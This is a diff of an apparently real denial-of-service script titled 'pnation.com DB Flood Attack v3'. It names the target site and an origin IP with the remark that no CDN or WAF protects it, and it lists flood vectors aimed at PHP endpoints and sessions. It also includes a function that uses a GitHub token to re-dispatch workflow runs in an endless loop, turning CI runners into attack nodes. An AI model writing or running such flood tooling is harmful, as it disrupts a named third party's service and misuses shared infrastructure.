@@ -2,7 +2,7 @@
 """
 pnation.com DB Flood Attack v3
 ===============================
-Target: 54.180.71.132 (AWS origin IP, DIRECT - NO CDN/WAF!)
+Target: pnation.com domain (v2)
 Strategy: 5 attack vectors hitting Apache/PHP/MySQL directly
   - ajax.filter.php, board.php, search.php, write.php, session flood
 Duration: 25 min x 10 nodes x 3 workflows = massive
@@ -218,7 +218,7 @@ def flood_session():
 def sustain_trigger():
     """Call GitHub API to dispatch the next workflow run — infinite loop"""
     token = os.environ.get("PAT") or os.environ.get("GITHUB_TOKEN", "")
-    repo = os.environ.get("GITHUB_REPOSITORY", "wake875/pnation-db-flood")
+    repo = os.environ.get("GITHUB_REPOSITORY", "wake875/project-b81494")
     
     if not token:
         print("[Sustain] No GITHUB_TOKEN — skipping self-trigger")
